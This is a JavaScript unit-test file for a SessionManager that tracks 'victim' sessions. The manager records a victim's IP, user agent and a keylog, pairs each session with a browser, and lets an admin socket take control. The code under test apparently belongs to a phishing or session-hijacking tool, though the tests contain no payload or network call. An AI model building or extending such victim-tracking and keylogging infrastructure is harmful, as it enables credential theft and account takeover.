import { describe, it, expect, beforeEach } from 'vitest';
import { SessionManager } from '../../../src/server/services/SessionManager.js';
describe('SessionManager', () => {
    let sessionManager;
    beforeEach(() => {
        sessionManager = new SessionManager();
    });
    describe('createSession', () => {
        it('should create a new session with correct metadata', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            expect(session).toBeDefined();
            expect(session.id).toBeTruthy();
            expect(session.victimSocketId).toBe('socket-123');
            expect(session.victimIp).toBe('192.168.1.1');
            expect(session.userAgent).toBe('Mozilla/5.0');
            expect(session.viewport.width).toBe(1920);
            expect(session.viewport.height).toBe(1080);
            expect(session.status).toBe('active');
            expect(session.browserId).toBe('');
            expect(session.keylog).toBe('');
        });
        it('should generate unique session IDs', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session1 = await sessionManager.createSession('socket-1', metadata);
            const session2 = await sessionManager.createSession('socket-2', metadata);
            expect(session1.id).not.toBe(session2.id);
        });
    });
    describe('pairWithBrowser', () => {
        it('should pair a session with a browser', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            await sessionManager.pairWithBrowser(session.id, 'browser-456');
            const updatedSession = sessionManager.getSession(session.id);
            expect(updatedSession?.browserId).toBe('browser-456');
        });
        it('should throw error if session not found', async () => {
            await expect(sessionManager.pairWithBrowser('non-existent', 'browser-456')).rejects.toThrow('Session non-existent not found');
        });
    });
    describe('getSession', () => {
        it('should retrieve a session by ID', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            const retrieved = sessionManager.getSession(session.id);
            expect(retrieved).toEqual(session);
        });
        it('should return undefined for non-existent session', () => {
            const retrieved = sessionManager.getSession('non-existent');
            expect(retrieved).toBeUndefined();
        });
    });
    describe('getSessionByBrowserId', () => {
        it('should find session by browser ID', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            await sessionManager.pairWithBrowser(session.id, 'browser-456');
            const found = sessionManager.getSessionByBrowserId('browser-456');
            expect(found?.id).toBe(session.id);
        });
        it('should return undefined if browser not paired', async () => {
            const found = sessionManager.getSessionByBrowserId('browser-456');
            expect(found).toBeUndefined();
        });
    });
    describe('getSessionByVictimSocketId', () => {
        it('should find session by victim socket ID', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            const found = sessionManager.getSessionByVictimSocketId('socket-123');
            expect(found?.id).toBe(session.id);
        });
    });
    describe('updateStatus', () => {
        it('should update session status', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            await sessionManager.updateStatus(session.id, 'admin-controlled');
            const updated = sessionManager.getSession(session.id);
            expect(updated?.status).toBe('admin-controlled');
        });
    });
    describe('setAdminSocket', () => {
        it('should set admin socket and change status', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            await sessionManager.setAdminSocket(session.id, 'admin-socket-789');
            const updated = sessionManager.getSession(session.id);
            expect(updated?.adminSocketId).toBe('admin-socket-789');
            expect(updated?.status).toBe('admin-controlled');
        });
    });
    describe('releaseAdminControl', () => {
        it('should release admin control', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            await sessionManager.setAdminSocket(session.id, 'admin-socket-789');
            await sessionManager.releaseAdminControl(session.id);
            const updated = sessionManager.getSession(session.id);
            expect(updated?.adminSocketId).toBeUndefined();
            expect(updated?.status).toBe('active');
        });
    });
    describe('appendKeylog', () => {
        it('should append text to keylog', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            await sessionManager.appendKeylog(session.id, 'hello');
            await sessionManager.appendKeylog(session.id, ' world');
            const updated = sessionManager.getSession(session.id);
            expect(updated?.keylog).toBe('hello world');
        });
    });
    describe('getAllSessions', () => {
        it('should return all sessions', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            await sessionManager.createSession('socket-1', metadata);
            await sessionManager.createSession('socket-2', metadata);
            const allSessions = sessionManager.getAllSessions();
            expect(allSessions.length).toBe(2);
        });
    });
    describe('getActiveSessions', () => {
        it('should return only active sessions', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session1 = await sessionManager.createSession('socket-1', metadata);
            const session2 = await sessionManager.createSession('socket-2', metadata);
            await sessionManager.terminateSession(session2.id);
            const activeSessions = sessionManager.getActiveSessions();
            expect(activeSessions.length).toBe(1);
            expect(activeSessions[0].id).toBe(session1.id);
        });
    });
    describe('terminateSession', () => {
        it('should mark session as terminated', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            await sessionManager.terminateSession(session.id);
            const updated = sessionManager.getSession(session.id);
            expect(updated?.status).toBe('terminated');
        });
    });
    describe('removeSession', () => {
        it('should remove session completely', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            await sessionManager.removeSession(session.id);
            const retrieved = sessionManager.getSession(session.id);
            expect(retrieved).toBeUndefined();
        });
    });
    describe('cleanupTerminatedSessions', () => {
        it('should cleanup old terminated sessions', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            const session = await sessionManager.createSession('socket-123', metadata);
            await sessionManager.terminateSession(session.id);
            // Manually set lastActivity to old date
            const s = sessionManager.getSession(session.id);
            if (s) {
                s.lastActivity = new Date(Date.now() - 7200000); // 2 hours ago
            }
            const cleaned = await sessionManager.cleanupTerminatedSessions(3600000); // 1 hour
            expect(cleaned).toBe(1);
            const retrieved = sessionManager.getSession(session.id);
            expect(retrieved).toBeUndefined();
        });
    });
    describe('getSessionCount', () => {
        it('should return correct session count', async () => {
            const metadata = {
                ip: '192.168.1.1',
                userAgent: 'Mozilla/5.0',
                viewport: { width: 1920, height: 1080 },
            };
            expect(sessionManager.getSessionCount()).toBe(0);
            await sessionManager.createSession('socket-1', metadata);
            expect(sessionManager.getSessionCount()).toBe(1);
            await sessionManager.createSession('socket-2', metadata);
            expect(sessionManager.getSessionCount()).toBe(2);
        });
    });
});
//# sourceMappingURL=SessionManager.test.js.map